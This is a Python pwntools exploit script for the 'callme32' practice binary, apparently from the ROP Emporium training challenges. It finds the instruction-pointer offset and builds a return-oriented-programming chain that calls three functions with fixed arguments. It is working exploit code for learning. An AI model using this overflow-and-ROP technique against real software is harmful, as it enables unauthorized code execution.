#!/usr/bin/python3
from pwn import *

def start():
	binary_path = "./callme32"
	p = process(binary_path)
	gdb.attach(p, gdbscript = '''
		b main
		continue
	''')
	return p

elf = context.binary = ELF("./callme32")
context.log_level = "info"
context.delete_corefiles = True

callme_one = elf.symbols.callme_one
callme_two = elf.symbols.callme_two
callme_three = elf.symbols.callme_three

rop = ROP(elf)
pop_esi_edi_ebp = rop.find_gadget(["pop esi", "pop edi", "pop ebp", "ret"])[0]

io = start()
payload = cyclic(100)
io.sendlineafter(">", payload)
io.wait()
core = io.corefile

eip = core.eip
eip_offset = cyclic_find(eip)
info("eip offset = %#x", eip_offset)

io = start()
payload = flat(
	asm('nop') * eip_offset,
	callme_one,
	pop_esi_edi_ebp,
	0xdeadbeef, 0xcafebabe, 0xd00df00d,
	callme_two,
	pop_esi_edi_ebp,
	0xdeadbeef, 0xcafebabe, 0xd00df00d,
	callme_three,
	pop_esi_edi_ebp,
	0xdeadbeef, 0xcafebabe, 0xd00df00d
	
)

io.sendlineafter(">", payload)

while 1:
	tmp = io.recv()
	info(tmp)



